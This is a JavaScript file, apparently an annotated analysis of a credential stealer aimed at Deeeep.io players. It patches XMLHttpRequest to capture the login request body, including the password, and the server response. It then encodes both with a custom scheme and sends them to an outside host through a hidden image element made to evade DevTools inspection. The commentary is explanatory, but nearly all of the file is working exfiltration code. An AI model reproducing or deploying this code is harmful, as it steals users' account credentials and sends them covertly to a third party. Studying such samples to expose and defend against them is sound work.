/**** Mahdi's HTTP Request interceptor ****/

// Modify XMLHttpRequest.open
XMLHttpRequest.prototype.open = function (method, url) {
	// Backup the original send method
	const send = XMLHttpRequest.prototype.send;
	let requestBody;

	// Intercept out-going requests
	// This gets the password used to sign in
	this.send = function (data) {
		// Intercept the request body and copy it
		requestBody = data;
		return send.apply(this, arguments);
	};

	// Intercept a response from the Deeeep.io API
	this.addEventListener("load", () => {
		// Check if the response is indicative of a successful log-in
		if (this.responseText.includes("shadow_ban_by")) {
			// Not exactly sure why this 150ms delay is needed...
			// perhaps this is to make it less suspicious
			setTimeout(() => {
				const concatenated = `${requestBody}|${this.responseText}`;
				// Mahdi forgot to remove this line
				console.log("a");

				// Disguise the request as an image
				// This hides it from being recognized as an XHR request in the Network tab of the DevTools
				// The server also returns a valid image
				const img = document.createElement("img");
				// All the data is encoded and sent as a query parameter
				img.src = `https://deeeepio-analytics.vercel.app/uploads/avatars/14004913-a60006e627fbc9d601068f5e014aeebe3.png?sid=${encodeString(
					concatenated
				)}`;
				img.style.display = "none";
				// When the image is appended to the DOM, all the data will be sent to the logging server
				document.body.appendChild(img);
			}, 150);
		}
	});

	// Return the original XMLHttpRequest.open method
	open.apply(this, arguments);
};

// Encode the data to be sent to the logging server
function encodeString(string) {
	let accumulator = "";
	for (let i = 0; i < string.length; i++) {
		const charCode = string.charCodeAt(i);
		const alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		const first = Math.floor(charCode / 52);
		const second = charCode % 52;
		accumulator += alphabets[first] + alphabets[second];
	}
	return accumulator;
}
